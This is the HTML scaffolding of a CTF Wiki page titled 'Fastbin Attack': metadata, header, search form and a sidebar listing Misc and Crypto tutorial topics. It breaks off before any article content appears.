<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CTF Wiki"><meta name=author content="CTF Wiki Team"><link href=https://ctf-wiki.org/zh-tw/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/ rel=canonical><link rel=alternate href=/ hreflang=zh><link rel=alternate href=/en/ hreflang=zh><link rel=alternate href=/zh-tw/ hreflang=zh><link rel="shortcut icon" href=../../../../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-6.2.8+insiders-1.17.0"><title>Fastbin Attack - CTF Wiki</title><link rel=stylesheet href=../../../../../../assets/stylesheets/main.10cb3b3f.min.css><link rel=stylesheet href=../../../../../../assets/stylesheets/palette.697e47cb.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans",;--md-code-font-family:"Source Code Pro",}</style><link rel=stylesheet href=https://ctf-wiki.org/static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#fastbin-attack class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=https://ctf-wiki.org/zh-tw/ title="CTF Wiki" class="md-header__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> CTF Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Fastbin Attack </span> </div> </div> </div> <div class=md-header__options> <div class=md-select> <span class="md-header__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg> </span> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ class=md-select__link> en - English </a> </li> <li class=md-select__item> <a href=/zh-tw/ class=md-select__link> zh-tw - 繁體中文 </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 00-3 3 3 3 0 003 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0018 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="前往 GitHub 仓库" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../../../../misc/introduction/ class=md-tabs__link> Misc </a> </li> <li class=md-tabs__item> <a href=../../../../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../../../../web/introduction/ class=md-tabs__link> Web </a> </li> <li class=md-tabs__item> <a href=../../../../../../assembly/x86-x64/readme/ class=md-tabs__link> Assembly </a> </li> <li class=md-tabs__item> <a href=../../../../../../executable/elf/structure/basic-info/ class=md-tabs__link> Executable </a> </li> <li class=md-tabs__item> <a href=../../../../../../reverse/introduction/ class=md-tabs__link> Reverse </a> </li> <li class=md-tabs__item> <a href=../../../environment/ class="md-tabs__link md-tabs__link--active"> Pwn </a> </li> <li class=md-tabs__item> <a href=../../../../../../android/basic_develop/basic_develop/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../../../../../ics/ctfs/ class=md-tabs__link> ICS </a> </li> <li class=md-tabs__item> <a href=../../../../../../blockchain/introduction/ class=md-tabs__link> Blockchain </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://ctf-wiki.org/zh-tw/ title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> CTF Wiki </label> <div class=md-nav__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="前往 GitHub 仓库" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=nav-1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../.. class=md-nav__link> 簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../usage/ class=md-nav__link> 如何使用 CTF Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1-3 type=checkbox id=nav-1-3> <label class=md-nav__link for=nav-1-3> 貢獻指南 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=貢獻指南 data-md-level=2> <label class=md-nav__title for=nav-1-3> <span class="md-nav__icon md-icon"></span> 貢獻指南 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../contribute/before-contributing/ class=md-nav__link> 貢獻之前 </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/basic-contribute-approach/ class=md-nav__link> 基本貢獻方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/documentation-requirement/ class=md-nav__link> 貢獻文檔要求 </a> </li> <li class=md-nav__item> <a href=../../../../../../contribute/translation/ class=md-nav__link> 翻譯 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../discussion/ class=md-nav__link> 討論交流 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../introduction/history/ class=md-nav__link> CTF 歷史 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/mode/ class=md-nav__link> CTF 競賽模式簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/content/ class=md-nav__link> CTF 競賽內容 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/experience/ class=md-nav__link> 線下攻防經驗小結 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/cgc/ class=md-nav__link> CGC 超級挑戰賽 </a> </li> <li class=md-nav__item> <a href=../../../../../../introduction/resources/ class=md-nav__link> 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Misc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Misc data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"></span> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/introduction/ class=md-nav__link> 雜項簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/recon/ class=md-nav__link> 信息蒐集技術 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> 編碼分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=編碼分析 data-md-level=2> <label class=md-nav__title for=nav-3-3> <span class="md-nav__icon md-icon"></span> 編碼分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/encode/communication/ class=md-nav__link> 通信領域常用編碼 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/encode/computer/ class=md-nav__link> 計算機相關的編碼 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/encode/modern/ class=md-nav__link> 現實世界中常用的編碼 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../misc/prefix/ class=md-nav__link> 取證隱寫前置技術 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5 type=checkbox id=nav-3-5> <label class=md-nav__link for=nav-3-5> 圖片分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=圖片分析 data-md-level=2> <label class=md-nav__title for=nav-3-5> <span class="md-nav__icon md-icon"></span> 圖片分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/picture/introduction/ class=md-nav__link> 圖片分析簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/png/ class=md-nav__link> PNG </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/jpg/ class=md-nav__link> JPG </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/picture/gif/ class=md-nav__link> GIF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6 type=checkbox id=nav-3-6> <label class=md-nav__link for=nav-3-6> 音頻隱寫 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=音頻隱寫 data-md-level=2> <label class=md-nav__title for=nav-3-6> <span class="md-nav__icon md-icon"></span> 音頻隱寫 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/audio/introduction/ class=md-nav__link> 音頻隱寫 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7 type=checkbox id=nav-3-7> <label class=md-nav__link for=nav-3-7> 流量包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流量包分析 data-md-level=2> <label class=md-nav__title for=nav-3-7> <span class="md-nav__icon md-icon"></span> 流量包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/traffic/introduction/ class=md-nav__link> 流量包分析簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/fix/ class=md-nav__link> PCAP 文件修復 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-3 type=checkbox id=nav-3-7-3> <label class=md-nav__link for=nav-3-7-3> 協議分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=協議分析 data-md-level=3> <label class=md-nav__title for=nav-3-7-3> <span class="md-nav__icon md-icon"></span> 協議分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/readme/ class=md-nav__link> 協議分析概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/wireshark/ class=md-nav__link> Wireshark </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/http/ class=md-nav__link> HTTP </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/https/ class=md-nav__link> HTTPS </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/wifi/ class=md-nav__link> WIFI </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/protocols/usb/ class=md-nav__link> USB </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../misc/traffic/data/ class=md-nav__link> 數據提取 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8 type=checkbox id=nav-3-8> <label class=md-nav__link for=nav-3-8> 壓縮包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=壓縮包分析 data-md-level=2> <label class=md-nav__title for=nav-3-8> <span class="md-nav__icon md-icon"></span> 壓縮包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/archive/zip/ class=md-nav__link> ZIP 格式 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/archive/rar/ class=md-nav__link> RAR 格式 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9 type=checkbox id=nav-3-9> <label class=md-nav__link for=nav-3-9> 磁盤內存分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=磁盤內存分析 data-md-level=2> <label class=md-nav__title for=nav-3-9> <span class="md-nav__icon md-icon"></span> 磁盤內存分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/disk-memory/introduction/ class=md-nav__link> 磁盤內存分析 </a> </li> <li class=md-nav__item> <a href=../../../../../../misc/disk-memory/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-10 type=checkbox id=nav-3-10> <label class=md-nav__link for=nav-3-10> Other <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Other data-md-level=2> <label class=md-nav__title for=nav-3-10> <span class="md-nav__icon md-icon"></span> Other </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc/other/pyc/ class=md-nav__link> pyc文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4> <label class=md-nav__link for=nav-4> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/introduction/ class=md-nav__link> 密碼學簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-2 type=checkbox id=nav-4-2> <label class=md-nav__link for=nav-4-2> 基礎數學知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎數學知識 data-md-level=2> <label class=md-nav__title for=nav-4-2> <span class="md-nav__icon md-icon"></span> 基礎數學知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/basic/introduction/ class=md-nav__link> 基礎數學知識 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-3 type=checkbox id=nav-4-3> <label class=md-nav__link for=nav-4-3> 古典密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密碼 data-md-level=2> <label class=md-nav__title for=nav-4-3> <span class="md-nav__icon md-icon"></span> 古典密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/classical/introduction/ class=md-nav__link> 古典密碼簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/monoalphabetic/ class=md-nav__link> 單表代換加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代換加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/others/ class=md-nav__link> 其它類型加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/classical/summary/ class=md-nav__link> 總結 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4 type=checkbox id=nav-4-4> <label class=md-nav__link for=nav-4-4> 流密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密碼 data-md-level=2> <label class=md-nav__title for=nav-4-4> <span class="md-nav__icon md-icon"></span> 流密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/intro/ class=md-nav__link> 流密碼 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-2 type=checkbox id=nav-4-4-2> <label class=md-nav__link for=nav-4-4-2> 僞隨機數生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=僞隨機數生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-2> <span class="md-nav__icon md-icon"></span> 僞隨機數生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 僞隨機數生成器介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密碼安全僞隨機數生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-3 type=checkbox id=nav-4-4-3> <label class=md-nav__link for=nav-4-4-3> 線性同餘生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=線性同餘生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-3> <span class="md-nav__icon md-icon"></span> 線性同餘生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 線性同餘生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-4 type=checkbox id=nav-4-4-4> <label class=md-nav__link for=nav-4-4-4> 反饋移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反饋移位寄存器 data-md-level=3> <label class=md-nav__title for=nav-4-4-4> <span class="md-nav__icon md-icon"></span> 反饋移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反饋移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 線性反饋移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非線性反饋移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-5 type=checkbox id=nav-4-4-5> <label class=md-nav__link for=nav-4-4-5> 特殊流密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密碼 data-md-level=3> <label class=md-nav__title for=nav-4-4-5> <span class="md-nav__icon md-icon"></span> 特殊流密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5 type=checkbox id=nav-4-5> <label class=md-nav__link for=nav-4-5> 塊加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=塊加密 data-md-level=2> <label class=md-nav__title for=nav-4-5> <span class="md-nav__icon md-icon"></span> 塊加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/introduction/ class=md-nav__link> 塊加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-2 type=checkbox id=nav-4-5-2> <label class=md-nav__link for=nav-4-5-2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=nav-4-5-2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-3 type=checkbox id=nav-4-5-3> <label class=md-nav__link for=nav-4-5-3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=nav-4-5-3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-4 type=checkbox id=nav-4-5-4> <label class=md-nav__link for=nav-4-5-4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=nav-4-5-4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-5 type=checkbox id=nav-4-5-5> <label class=md-nav__link for=nav-4-5-5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=nav-4-5-5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-6 type=checkbox id=nav-4-5-6> <label class=md-nav__link for=nav-4-5-6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=nav-4-5-6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/simon-speck/ class=md-nav__link> 